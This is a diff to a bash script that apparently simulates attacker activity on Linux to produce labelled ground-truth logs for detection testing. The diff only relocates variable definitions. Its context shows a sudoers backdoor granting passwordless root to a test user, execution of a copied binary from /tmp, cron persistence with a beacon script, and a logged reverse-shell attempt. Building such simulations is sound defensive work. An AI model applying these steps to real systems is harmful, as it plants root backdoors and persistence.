@@ -32,6 +32,10 @@ fi
 # Configuration
 USERNAME="testattacker"
 OUTPUT_FILE="linux_attack_log.json"
+SUDOERS_FILE="/etc/sudoers.d/backdoor"
+CRON_FILE="/etc/cron.d/persistence_test"
+BEACON_SCRIPT="/tmp/beacon.sh"
+SUSPICIOUS_BIN="/tmp/suspicious_bin"
 
 # Arrays for ground truth collection
 declare -a ACTIONS
@@ -87,7 +91,7 @@ ACTION_COUNT=$((ACTION_COUNT + 1))
 TIMESTAMP=$(get_utc_timestamp)
 printf "    [%d/6] Modifying sudoers...                        %s\n" "$ACTION_COUNT" "$TIMESTAMP"
 
-SUDOERS_FILE="/etc/sudoers.d/${USERNAME}_backdoor"
+# Modify /etc/sudoers.d/backdoor for privilege escalation
 if echo "${USERNAME} ALL=(ALL) NOPASSWD:ALL" > "$SUDOERS_FILE" 2>/dev/null; then
     chmod 440 "$SUDOERS_FILE" 2>/dev/null || true
     SUDOERS_MODIFIED=true
@@ -101,7 +105,6 @@ ACTION_COUNT=$((ACTION_COUNT + 1))
 TIMESTAMP=$(get_utc_timestamp)
 printf "    [%d/6] Executing from /tmp...                      %s\n" "$ACTION_COUNT" "$TIMESTAMP"
 
-SUSPICIOUS_BIN="/tmp/suspicious_bin"
 if cp /usr/bin/id "$SUSPICIOUS_BIN" 2>/dev/null; then
     TMP_BINARY_EXISTS=true
     if "$SUSPICIOUS_BIN" 2>/dev/null; then
@@ -131,9 +134,6 @@ add_ground_truth_entry "$ACTION_COUNT" "Attempted reverse shell connection to lo
 ACTION_COUNT=$((ACTION_COUNT + 1))
 TIMESTAMP=$(get_utc_timestamp)
 printf "    [%d/6] Cron persistence...                         %s\n" "$ACTION_COUNT" "$TIMESTAMP"
-
-CRON_FILE="/etc/cron.d/persistence_test"
-BEACON_SCRIPT="/tmp/beacon.sh"
 
 # Create dummy beacon script
 echo '#!/bin/bash' > "$BEACON_SCRIPT" 2>/dev/null || true
